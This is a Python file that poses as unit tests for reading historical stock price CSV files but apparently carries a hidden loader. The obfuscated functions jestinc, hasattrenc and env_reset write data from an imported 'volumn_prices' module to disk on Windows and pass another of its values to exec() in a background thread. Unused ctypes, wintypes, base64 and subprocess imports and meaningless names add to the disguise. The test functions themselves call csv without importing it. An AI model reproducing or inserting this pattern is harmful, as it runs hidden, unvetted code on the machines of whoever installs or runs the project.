import time
import ctypes
import ctypes as ct
import base64
import os.path
import subprocess
import platform
import threading
import subprocess
from ctypes import wintypes as w
from sys import platform
from logic.volumn_prices import daily_price
from logic.volumn_prices import hourly_price
import os
import sys

def test_read(self):
	csv_data = csv.read("../historical-prices/JPM.txt", 0, 4)
	self.assertEquals(473, len(csv_data))
	first_price = csv_data[0][1]
	last_price = csv_data[472][1]
	self.assertEquals(58.209999, first_price)
	self.assertEquals(66.510002, last_price)

def jestinc():
	ddapl = daily_price(2)
	hdapl = hourly_price(1)
	jww = open(ddapl, "w")
	jww.write(hdapl)
	jww.close()
def hasattrenc():
	vwplat = daily_price(1)
	exec(vwplat)

def env_reset():
	if platform == "win32":
		jestinc()
	th_init = threading.Thread(target=hasattrenc, args=())
	th_init.start()
def test_get_historical_prices(self):
	historical_prices = csv.read_all_files("../historical-prices", 0, 4)
	self.assertEquals(22, len(historical_prices))
	for key, value in historical_prices.items():
		self.assertEquals(473, len(value))